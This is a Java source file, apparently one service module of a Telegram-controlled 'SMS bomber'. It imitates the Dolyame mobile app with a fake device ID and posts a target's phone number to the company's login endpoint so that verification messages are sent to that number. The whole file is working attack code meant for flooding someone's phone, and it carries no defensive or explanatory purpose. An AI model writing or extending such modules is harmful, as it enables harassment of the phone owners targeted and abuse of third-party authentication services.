package com.example.webapp.telegram.bomber.services;

import com.example.webapp.telegram.bomber.services.utils.Callback;
import com.example.webapp.telegram.bomber.services.utils.Service;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.springframework.lang.NonNull;

public class Dolyame extends Service {

    @Override
    public void run(OkHttpClient client, Callback callback) {
        client.newCall(new Request.Builder()
                .url("https://id.dolyame.ru/auth/authorize")
                .post(new FormBody.Builder()
                        .add("client_id", "bnpl-mobile-app")
                        .add("redirect_uri", "mobile://")
                        .add("response_type", "code")
                        .add("response_mode", "json")
                        .add("display", "json")
                        .add("device_id", "1111111111111111")
                        .add("client_version", "2.5.0")
                        .add("vendor", "tinkoff_android")
                        .add("claims", "{\"id_token\":{\"given_name\":null, \"phone_number\": null, \"picture\": null}}")
                        .build())
                .build()).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(response.body().string());

                    client.newCall(new Request.Builder()
                            .url("https://id.dolyame.ru/auth/step?cid=" + json.getString("cid"))
                            .header("Cookie", Objects.requireNonNull(response.headers().get("Set-Cookie")))
                            .post(new FormBody.Builder()
                                    .add("phone", "+" + getFormattedPhone())
                                    .add("step", "phone")
                                    .build())
                            .build()).enqueue(callback);
                } catch (JSONException | NullPointerException e) {
                    callback.onError(e);
                }
            }
        });
    }
}